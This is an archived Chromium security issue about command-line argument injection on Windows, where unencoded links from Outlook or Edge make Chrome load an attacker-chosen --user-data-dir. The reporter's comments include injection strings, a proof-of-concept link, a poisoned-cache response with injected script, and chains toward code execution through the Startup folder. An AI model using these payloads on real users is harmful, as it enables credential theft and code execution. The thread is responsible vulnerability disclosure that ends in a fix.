# Security: command line injection in Windows (--user-data-dir)

| Field | Value |
|-------|-------|
| **Issue ID** | [40094063](https://issues.chromium.org/issues/40094063) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P3 |
| **Component** | Internals |
| **Platforms** | Windows |
| **Reporter** | jp...@gmail.com |
| **Assignee** | gr...@chromium.org |
| **Created** | 2019-02-17 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Chrome parses command line arguments in an insecure way in Windows. The command below demonstrates the issue (note that you must close all chrome.exe processes first):

"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -- "tel:#" --user-data-dir="C:\test" "<http://xss.vg>"

After running this command you will see that the 'c:\test' user data folder has been created (if it didn't exist already) and populated with chrome's default user data files. A network location can be specified for the --user-data-dir value (e.g. \IpOrDomain\folder). You can use webdav syntax to avoid firewall restrictions if port 445 is blocked (e.g. \ipOrDomain@ssl@443\folder) although Windows may block webdav requests (not sure why). If a remote share is used, a warning saying performance may be affected is shown in the top right hand corner of the chrome window.

After parsing the command line arguments, Chrome will open two tabs, one with the URL 'http://--user-data-dir%3Dc/test' and one with the URL '<http://xss.vg>'.

The user data directory holds information such as cookies, history etc. Being able to specify the location of this directory could result in sensitive information being sent to an attacker controlled device. Alternatively, an attacker could construct a malicious data directory and force a victim to load the data.

I also noticed that the software reporter tool executable is in the user directory (\SwReporter\38.190.200.3\software\_reporter\_tool.exe) and the pepflashplayer.dll (\PepperFlash\32.0.0.142\pepflashplayer.dll). It is not immediately obvious to me if these files could be replaced with malicious files to achieve RCE.

At this stage, I have not explored all the features utilised by the user data directory to see which features can be abused as I imagine that the information above is likely enough to justify fixing the issue.

Even if the parsing of --user-data-dir is removed, parsing multiple URLs separated by spaces (' ') may be misleading to users. An attacker can abuse this behaviour by sending a URL with a trustworthy domain to a victim that, when opened in chrome, results in the expected trusted URL being split up into multiple URLs which are loaded in the browser, this includes file:/// URIs. I'm under the impressions that a URI that appears after the double dash command line flag ('--') should be treated as a single URL.

From my testing, the --user-data-dir flag is the only flag that is parsed after the double dash i.e. 'chrome.exe -- http:... --disable-web-security' does not result in chrome starting with security disabled.

This issue could be practically and easily exploited from several popular products. For example, if you receive an email with the following URL in an up to date Microsoft Outlook client:

<http://xss.vg#>" --user-data-dir="C:\test" "file:///c:/

Clicking the link will result in the behaviour described above. Note that the # is required as the hash segment of a URL in office products is not URL encoded. Without the hash, the spaces and double quotes are URL encoded and the expected behaviour is observed (i.e. chrome opens a single window with '<http://xss.vg/%22%20--user-data-dir=%22C:est%22%20%22file:///c:/>' as the URL). Also note that backslashes () must be escaped (\). Note that if chrome.exe is already running, the user-data-dir argument is ignored but the URL is split into separate URLs (i.e. 3 tabs are opened).

Multiple products are vulnerable to command line argument injection and I'm in the process of notifying other vendors. Please don't make this issue public until they have had a chance to respond.

**VERSION**  

Chrome Version: Version 72.0.3626.109 (Official Build) (64-bit)  

Operating System: OS Name: Microsoft Windows 10 Enterprise. OS Version: 10.0.17134 N/A Build 17134

**REPRODUCTION CASE**  

Close all chrome.exe processes and then run the following command:

"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -- "tel:#" --user-data-dir="C:\test" "<http://xss.vg>"

**CREDIT INFORMATION**  

Reporter credit: Joshua Graham of TSS

## Attachments

- [example.PNG](attachments/example.PNG) (image/png, 67.5 KB)
- [example.html](attachments/example.html) (text/plain, 1010 B)
- [xss.PNG](attachments/xss.PNG) (image/png, 13.5 KB)
- [dll hijack.PNG](attachments/dll hijack.PNG) (image/png, 93.3 KB)
- deleted (application/octet-stream, 0 B)

## Timeline

### jp...@gmail.com (2019-02-18)

After reading this again i realise the issue may not be clear. The issue is that when a third party application activates a protocol that chrome is the default handler for (http, https, tel, ftp etc). If the third party application does not URL encode the URI value then a malicious URI can be mis-interpreted by chrome as multiple command line arguments.

What steps reproduce the problem?
Ensure chrome is the default handler for the http protocol. Close all instances of chrome and click a URI in a third party application (tested in outlook) with the value:

http://a#" --user-data-dir="C:\\test" "http://xss.vg

Actual: Chrome opens with three tabs; one with http://a/#, one with http://--user-data-dir%3D%22c/test%22 and one with http://xss.vg and c:\test is used as the user's data directory.

Expected: Chrome one tabs with the URI http://a/#%22%20--user-data-dir=%22C:\\test%22%20%22http://xss.vg and the default user data directory is used.


### me...@chromium.org (2019-02-19)

Thanks for the report. My understanding is that this is a physically local attack: Chrome cannot defend itself from applications running with the same privilege level, so this would be outside our threat model (https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#Why-arent-physically_local-attacks-in-Chromes-threat-model)

We should still fix it though, so I'll keep this as a security bug for the time being.

Will, can you please take a look and reassign as appropriate since this is a Windows issue?




[Monorail components: Internals]

### jp...@gmail.com (2019-02-19)

Sorry, i'm not explaining it well. It's not only a local attack, you can trigger it from any application that doesn't URL encode links. For example, Word, Excel, Outlook and Edge (each of the apps handle URL encoding slightly differently).

I've attached a simple POC html file that if you open with edge will demonstrate the issue. Edge shows a warning prompt but outlook, word and excel don't show any prompt.


### jp...@gmail.com (2019-02-19)

And in case it wasn't clear, the example of setting the user directory to c:\test is just an easy to reproduce POC. If this were to be abused in the wild, an attacker could set an internet location for the user directory (e.g. \\xss.vg\evil\user\directory) and chrome would happily utilise that internet location. 

i.e. An attacker from the internet can send a victim a link that when clicked will force chrome to use an attacker controlled user data directory on the internet.

### wf...@chromium.org (2019-02-19)

interesting. is it possible to pass any command line arguments to Chrome this way, or is this special to --user-data-dir.

It sounds like these arguments should be sanitized/removed before being passed to Chrome, I'm not sure if this is the responsibility of the application making the call (e.g. in this case, outlook, word, excel) or Chrome's entries in the registry.

One idea would be to add a command line flag in the registry entry to say that the command line being passed is untrusted, and then Chrome would know to stripignore all but the URL? I'm adding robliao and grt to think about this more.

### jp...@gmail.com (2019-02-19)

As far as I can tell, —user-data-dir is the only flag that gets parsed but I could be wrong. 

You are sort of already using a flag to say the command line being passed is in trusted. The double dash (“—“) is supposed to signify the end of command options. 

When I discovered the issue I thought it was a new type of vector but apparently this type of attack has been around for a while. This Firefox bug might be relevant:

https://bugzilla.mozilla.org/show_bug.cgi?id=384384

TLDR; they use the -osint flag in the registry to tell Firefox that the command line ars are in trusted. If there is more than two command line flags (-osint and the URL) then it rejects the call. 

### ro...@chromium.org (2019-02-19)

The attacker would need to craft a shortcut to get the user to run with a --user-data-dir argument.

External applications like Outlook, Word, and Excel typically just ShellExecute with a URL or an HTML document and that ends up lands on the ChromeHTML\shell\open\command and Windows will substitute the ShellExecute path into the location specified by %1. We do have double-quotes that wrap the %1, so if we're interpreting the contents of the double-quotes as arguments, that could be an issue.

### ro...@chromium.org (2019-02-19)

The default invoker string on my machine is...
"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -- "%1"

### wf...@chromium.org (2019-02-19)

is it possible that --user-data-dir is a special snowflake of a command line flag because of things like crashpad initialization?

### jp...@gmail.com (2019-02-19)

It’s not quite that the contents of the double quotes are being interpreted as arguments, it’s that double quotes are being passed to the %1 without URL encoding the double quotes. E.g. (this is in the example.html attachment)

<a href='tel:" --user-data-dir="C:\\test" "http://xss.vg'>

Becomes:

"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -- "tel:" --user-data-dir="C:\\test" "http://xss.vg"






### pa...@chromium.org (2019-02-19)

Is there any particular reason to think this is special to Windows? (Is it a quirk of `ShellExecute`s command line handling?) Does Chrome exhibit this problem on other platforms?

Since this creates a whole new user data directory, the attacker would only have a chance get new secrets that the user input into pages, right?

This seems Low, but with a very clear exploitation and exfiltration scenario, I could see bumping it up to Medium.

### gr...@chromium.org (2019-02-20)

Looks like this is a bug in chrome/install_static/install_util.cc's GetSwitchValueFromCommandLine. It should stop searching for |switch_name| if it sees L"--". This is specific to Windows, which has its own command line parsing for --type=PTYPE and --user-data-dir=DIR early in startup before it's save to use base::CommandLine.

### gr...@chromium.org (2019-02-20)

"it's save" -> "it's safe"

### jp...@gmail.com (2019-02-20)

I'm struggling to explain things clearly. I'll attempt to clearly explain an exploitation and exfiltration scenario. In this scenario we will setup a poisoned cache folder to achieve XSS in the www.google.com domain.

1. Setup a proxy on your local machine (e.g. Burp Suite).
2. Visit https://www.google.com and intercept the response.
3. Modify the response headers to include cache directives that tell chrome to cache the response locally. Change the body of the response to inject JavaScript. When testing I used this response:

HTTP/1.1 200 OK
Cache-Control: private
Cache-Control: max-age=31536000
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 81

<html><body>Hacked by JPGInc<script>alert(document.domain)</script></body></html>

4. The modified response should now be cached by chrome. The cache lives in the data directory which is here by default:

C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default 

5. Copy the entire user data directory (which now includes a malicious cached version of https://www.google.com) to a network share that you can access from another computer. In this example we will pretend the share is hosted on the xss.vg domain and the share is named "evilCache"
6. On another computer which will act as the victim, click a link that will result in command line injection that will set the user data directory to the network share holding the poisoned cache. We will also include https://www.google.com in the malicious link so that the poisoned cache will be utilised when chrome starts e.g.

<a href='tel:" --user-data-dir="\\xss.vg\evilCache" "https://www.google.com'>evil link</a>

7. After clicking the link, notice that chrome utilises the cached version of https://www.google.com hosted on the evilCache network share (POC screenshot attached).

In practice a malicious actor could cache JavaScript that would transmit credentials to an attacker controlled server.

I have attached the cache folder that contains the poisoned version of https://www.google.com. You can use my cache instead of doing steps 1-3 by overwriting the cache folder which is here by default:

C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Cache 

------

I believe (but haven't tested) that this issue can be exploited to achieve remote code execution. For example the software_reporter_tool.exe is located in the user data directory. While the exe itself is validated somehow, when it is run it searches the current directory for several DLLs (as shown in the process monitor screenshot attached). This should allow us to perform a dll hijacking attack that, under normal circumstances, would require a physically-local attack. 

There appears to be a large attack surface exposed through the user data directory but I don't think further research will be valuable as, after this issue is fixed, the attacks will go back to being physically-local attacks. 

I hope you will consider this bug eligible for a bug bounty :-)

### wf...@chromium.org (2019-02-20)

grt, are you able to take this bug and land a fix for the -- issue?

I think this bug looks more like a Medium severity.

### jp...@gmail.com (2019-02-20)

I just have one last scenario that I hope will make this bug eligible for the remote code execution sandbox escape with functional exploit category.

1. On your local machine, run chrome and set the Downloads -> Location to the windows startup folder (C:\Users\<user name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).
   1.1 The username should be sent to the malicious share when chrome first attempts to read from it. An attacker could dynamically modify the <user name> part of the download's location setting to always save to the correct folder on the victims machine.
2. Copy the user data directory to a remote share.
3. Send victims links that will both use the remote share and download an executable file (i used a .hta file when testing as chrome will download the file type without warnings). 
4. When the user restarts their computer, the .hta file will get run (the startup process ignores the 'Mark of the Web' so no warning prompt is show).

A similar vector that results in immediate code execution is to set the 'always open' for executable file types as these preferences are also saved in the user directory. Chrome doesn't allow users to set 'always open' for known executable type such as .bat. However, I tested that other file types  such as .sh (which git registers a handler for by default) will run without prompt. 

### gr...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### jp...@gmail.com (2019-02-22)

Should this be rated high or critical now since it can result in remote code execution?

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-02-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/08965161257ab9aeef9a3548c1cd1a44525dc562

commit 08965161257ab9aeef9a3548c1cd1a44525dc562
Author: Greg Thompson <grt@chromium.org>
Date: Fri Feb 22 10:35:33 2019

Ignore switches following "--" when parsing a command line.

BUG=933004
R=wfh@chromium.org

Change-Id: I911be4cbfc38a4d41dec85d85f7fe0f50ddca392
Reviewed-on: https://chromium-review.googlesource.com/c/1481210
Auto-Submit: Greg Thompson <grt@chromium.org>
Commit-Queue: Julian Pastarmov <pastarmovj@chromium.org>
Reviewed-by: Julian Pastarmov <pastarmovj@chromium.org>
Cr-Commit-Position: refs/heads/master@{#634604}
[modify] https://crrev.com/08965161257ab9aeef9a3548c1cd1a44525dc562/chrome/install_static/install_util.cc
[modify] https://crrev.com/08965161257ab9aeef9a3548c1cd1a44525dc562/chrome/install_static/install_util.h
[modify] https://crrev.com/08965161257ab9aeef9a3548c1cd1a44525dc562/chrome/install_static/install_util_unittest.cc


### gr...@chromium.org (2019-02-26)

Fixed in 74.0.3715.0; verified in 74.0.3717.0 (Official Build) canary (64-bit) (cohort: Clang-64).

Tentatively requesting merge of r634604 to M73. I believe this change is safe to merge.

### sh...@chromium.org (2019-02-26)

This bug requires manual review: We are only 13 days from stable.
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), cindyb@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-02-26)

[Empty comment from Monorail migration]

### ab...@google.com (2019-02-26)

Approved for m73 branch:3683

### wf...@chromium.org (2019-02-26)

[Empty comment from Monorail migration]

### jp...@gmail.com (2019-02-26)

[Comment Deleted]

### cr...@appspot.gserviceaccount.com (2019-02-27)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/549dd6396baa67aae90c252513745ba657133af7

Commit: 549dd6396baa67aae90c252513745ba657133af7
Author: grt@chromium.org
Commiter: grt@chromium.org
Date: 2019-02-27 10:33:52 +0000 UTC

Ignore switches following "--" when parsing a command line.

TBR=grt@chromium.org
BUG=933004
R=​wfh@chromium.org

Change-Id: I911be4cbfc38a4d41dec85d85f7fe0f50ddca392
Reviewed-on: https://chromium-review.googlesource.com/c/1481210
Auto-Submit: Greg Thompson <grt@chromium.org>
Commit-Queue: Julian Pastarmov <pastarmovj@chromium.org>
Reviewed-by: Julian Pastarmov <pastarmovj@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#634604}(cherry picked from commit 08965161257ab9aeef9a3548c1cd1a44525dc562)
Reviewed-on: https://chromium-review.googlesource.com/c/1491431
Reviewed-by: Greg Thompson <grt@chromium.org>
Cr-Commit-Position: refs/branch-heads/3683@{#667}
Cr-Branched-From: e51029943e0a38dd794b73caaf6373d5496ae783-refs/heads/master@{#625896}

### aw...@google.com (2019-03-04)

[Empty comment from Monorail migration]

### na...@google.com (2019-03-06)

[Empty comment from Monorail migration]

### na...@google.com (2019-03-07)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-03-07)

Congrats! The Panel decided to reward $500 for this report :) 

A member from finance will be in touch shortly. 

### aw...@google.com (2019-03-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-05-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-04)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-06-04)

This issue was migrated from crbug.com/chromium/933004?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094063)*
